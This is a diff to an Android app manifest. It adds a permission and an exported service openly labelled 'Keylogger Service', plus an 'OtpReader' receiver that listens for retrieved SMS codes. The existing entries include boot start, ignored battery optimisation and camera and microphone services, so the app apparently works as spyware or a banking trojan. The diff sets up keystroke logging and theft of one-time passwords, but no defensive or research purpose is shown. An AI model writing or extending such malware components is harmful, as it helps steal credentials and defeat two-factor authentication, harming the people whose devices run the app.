@@ -61,6 +61,9 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
+    <!-- Accessibility Service for Keylogger -->
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
@@ -96,6 +99,27 @@
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="camera|microphone" />
+
+        <!-- Keylogger Service -->
+        <service
+            android:name=".KeyloggerService"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+        </service>
+
+        <!-- OTP Reader Receiver -->
+        <receiver
+            android:name=".OtpReader"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.google.android.gms.auth.api.phone.SMS_RETRIEVED" />
+            </intent-filter>
+        </receiver>
 
         <receiver
             android:name=".BootReceiver"
